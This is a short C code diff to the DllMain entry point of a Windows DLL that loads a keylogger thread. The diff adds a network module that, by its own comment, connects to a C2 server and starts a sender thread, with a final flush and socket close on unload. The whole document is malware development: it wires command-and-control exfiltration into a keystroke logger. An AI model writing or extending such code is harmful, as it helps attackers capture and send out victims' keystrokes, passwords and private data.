@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include "keylogger.h"
+#include "network.h"
 
 // DLL Entry Point
 // Called when DLL is loaded or unloaded from a process
@@ -12,6 +13,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 
         // Disable DLL_THREAD_ATTACH/DETACH notifications for performance
         DisableThreadLibraryCalls(hModule);
+
+        // Initialize network module (reads config, connects to C2, starts sender thread)
+        InitNetwork(hModule);
 
         // Start the keylogger thread
         if (!StartKeylogger()) {
@@ -27,6 +31,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 
         // Stop the keylogger thread gracefully
         StopKeylogger();
+
+        // Cleanup network module (final flush, close socket)
+        CleanupNetwork();
         break;
 
     case DLL_THREAD_ATTACH:
